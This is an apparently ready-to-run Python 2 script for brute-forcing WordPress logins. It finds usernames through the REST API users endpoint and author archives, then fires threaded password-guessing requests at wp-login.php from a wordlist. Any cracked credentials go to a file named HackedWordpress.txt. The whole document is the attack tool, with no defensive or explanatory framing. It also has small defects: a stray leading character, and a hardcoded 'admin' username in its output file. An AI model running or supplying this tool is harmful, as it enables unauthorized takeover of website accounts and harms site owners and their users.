8# coding=utf-8
import threading, time, re, os, sys, json, random
import requests
import time


def cls():
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

def print_logo():
        print ("""------------------------------------------------""")
        print ("""	  WORDPRESS BRUTE FORCE """)
        print ("""------------------------------------------------""")

class WordPressbf(object):

        def __init__(self):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            site = raw_input(self.c + '    [+]  Target: ' + self.c)
            if site.startswith('http://'):
                site = site.replace('http://', '')
            elif site.startswith('https://'):
                site = site.replace('https://', '')
            else:
                pass
            print self.c + '    [+]  START BruteForce : ' \
                + self.c + site
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                source = requests.get('http://' + site + '/wp-login.php', timeout=5, headers=agent).text.encode('utf-8')
                print self.c + '       [+]'  \
                    ' [Trying to Get Wp-login.php SourceCode] ' + self.g + ' [OK]'
                time.sleep(0.5)
            except:
                print self.c + '       [-]'  \
                    ' [ URL Not valid or Timeout! or Your Ip Address Blocked! ]'
                sys.exit()

            try:
                WpSubmitValue = re.findall('class="button button-primary button-large" value="(.*)"', source)[0]
                print self.c + '       [+]'  \
                    ' [Trying to Get WpSubmit Value From SourceCode] ' + self.g + ' [OK]'
                time.sleep(0.5)

            except:
                print self.c + '       [-] '  \
                    ' [Trying to Get WpSubmit Value From SourceCode] ' + self.r + ' [NO]'
                sys.exit()
            try:
                WpRedirctTo = re.findall('name="redirect_to" value="(.*)"', source)[0]
                print self.c + '       [+]'  \
                    ' [Trying to Get WpRedirctTo Value From SourceCode] ' + self.g + ' [OK]'
                time.sleep(0.5)

            except:
                print self.c + '       [-]'  \
                    ' [Trying to Get WpRedirctTo Value From SourceCode] ' + self.r + ' [NO]'
                sys.exit()
            if 'Log In' in WpSubmitValue:
                WpSubmitValue = 'Log+In'
            else:
                WpSubmitValue = WpSubmitValue
            usgen = self.UserName_Enumeration(site)
            if usgen != None:
                Username = usgen
                time.sleep(1)
                print self.c + '       [+]'  \
                    ' Enumeration Username:  ' + self.g + str(Username) + self.g + ' [OK]'
            else:
                try:
                    Username = raw_input(self.c + '       [*]' 
                                        ' Username for Start BF: ')
                    if Username == '':
                        print self.c + '       [-]'  \
                            ' [Username] ' + self.r + ' [NO]'
                        sys.exit()
                except:
                    print self.c + '       [-]'  \
                        ' [Username] ' + self.r + ' [NO]'
                    sys.exit()

            try:
                password = raw_input(self.c + '       [*] input Password list (Put your wordlist on files/2/ ): ')
                with open(password, 'r') as xx:
                    passfile = xx.read().splitlines()
                print self.c + '       [+] ' + self.g + \
                    str(len(passfile)) + self.c + ' Passwords imported!'
                time.sleep(2)
            except:
                print self.c + '       [-]'  \
                    ' [Password list] ' + self.r + ' [NO]'
                sys.exit()

            thread = []

            for passwd in passfile:
                t = threading.Thread(target=self.BruteForce, args=(site, passwd, WpSubmitValue, WpRedirctTo, Username))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print self.c + '       [-] ' + self.r + site + ' ' \
                    + self.y + 'wordpress [Not Vuln]'



        def UserName_Enumeration(self, site):
            _cun = 1
            Flag = True
            __Check2 = requests.get('http://' + site + '/?author=1', timeout=10)
            try:
                while Flag:
                    GG = requests.get('http://' + site + '/wp-json/wp/v2/users/' + str(_cun), timeout=5)
                    __InFo = json.loads(GG.text)
                    if 'id' not in __InFo:
                        Flag = False
                    else:
                        Usernamez = __InFo['slug']
                        return str(Usernamez).encode('utf-8')
                    break
            except:
                try:
                    if '/author/' not in __Check2.text:
                        return None
                    else:
                        find = re.findall('/author/(.*)/"', __Check2.text)
                        username = find[0]
                        if '/feed' in username:
                            find = re.findall('/author/(.*)/feed/"', __Check2.text)
                            username2 = find[0]
                            return username2.encode('utf-8')
                        else:
                            return username.encode('utf-8')
                except requests.exceptions.ReadTimeout:
                    return None

        def BruteForce(self, site, passwd, WpSubmitValue, WpRedirctTo, Username):
            agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            post = {}
            post['log'] = Username
            post['pwd'] = passwd
            post['wp-submit'] = WpSubmitValue
            post['redirect_to'] = WpRedirctTo
            post['testcookie'] = 1
            url = "http://" + site + '/wp-login.php'
            GoT = requests.post(url, data=post, headers=agent, timeout=10)
            print self.c + '       [+]'  \
                ' Testing: ' + self.y + passwd
            if 'wordpress_logged_in_' in str(GoT.cookies):
                print self.c + '       [+] ' + \
                    self.y + site + ' username: ' + self.g \
                    + Username + self.y + ' Password: ' + self.g + passwd
                with open('HackedWordpress.txt', 'a') as writer:
                    writer.write('http://' + site + '/wp-login.php' + '\n Username: admin' + '\n Password: ' +
                                passwd + '\n-----------------------------------------\n')
                self.flag = 1

      
cls()
print_logo()
try:
    WordPressbf()
except KeyboardInterrupt:
    print('\033[97m\nGoing Back...\033[1;m')
    time.sleep(1)
    cls()
    os.system(" chmod +x brute.py && python2 brute.py")